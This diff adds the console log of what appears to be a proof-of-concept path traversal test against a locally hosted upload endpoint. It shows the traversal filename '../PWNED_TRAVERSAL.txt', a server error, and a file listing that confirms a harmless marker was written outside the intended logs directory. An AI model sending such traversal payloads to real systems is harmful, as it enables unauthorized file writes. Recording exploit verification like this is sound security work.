@@ -1,0 +1,10 @@
+[*] POST http://127.0.0.1:8080/api/access
+[*] malicious filename = '../PWNED_TRAVERSAL.txt'
+[*] HTTP 500  (request may 500 on the model step; file.save()
+    runs BEFORE that crash, so the out-of-bounds write already happened)
+[*] body[:200]: <!doctype html> <html lang=en>   <head>     <title>cv2.error: OpenCV(4.10.0) /io/opencv/modules/imgcodecs/src/loadsave.cpp:813: error: (-215:Assertion failed) !buf.empty() in function &#39;imdecode_&#
+[*] Proof is verified on the container filesystem by the orchestrator.
+--- filesystem proof (file outside logs/?) ---
+[+] WROTE original/PWNED_TRAVERSAL.txt (ESCAPED ./logs/):
+-rw-r--r--. 1 astra astra 70 Oct 25 16:15 original/PWNED_TRAVERSAL.txt
+benign marker: path traversal write escaped ./logs/ into the app root
